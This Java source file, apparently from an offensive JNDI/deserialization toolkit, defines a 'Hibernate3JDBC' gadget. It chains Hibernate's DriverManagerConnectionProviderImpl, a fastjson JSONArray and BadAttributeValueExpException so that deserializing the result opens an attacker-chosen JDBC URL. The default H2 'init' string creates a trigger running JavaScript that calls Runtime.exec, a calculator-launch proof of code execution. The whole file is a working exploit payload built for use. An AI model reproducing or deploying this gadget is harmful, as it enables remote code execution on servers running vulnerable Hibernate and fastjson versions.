package com.qi4l.jndi.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

@Dependencies({"org.hibernate:<4.2","com.alibaba.fastjson:com.alibaba.fastjson1.X"})
@Authors({Authors.Unam4})
public class Hibernate3JDBC implements ObjectPayload<Object>, DynamicDependencies {
    private static  String cmd = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
            "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
            "java.lang.Runtime.getRuntime().exec('open -a calculator')\n" +
            "$$\n";
    public Object getObject(String command) throws Exception {

        if (!command.toLowerCase().startsWith("jdbc:")) {
            throw new Exception("Command format is: eviljdbcurl");
        }
        cmd = command;
        DriverManagerConnectionProviderImpl o = new DriverManagerConnectionProviderImpl();
        HashMap<Object, Object> map1 = new HashMap<>();
//        map1.put("hibernate.connection.driver_class","org.h2.Driver");
        map1.put("hibernate.connection.url",cmd);
        map1.put("hibernate.connection.initial_pool_size",0);
        map1.put("hibernate.hikari.minimumIdle",0);
        o.configure(map1);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(o, val);
        return hashMap;
    }
}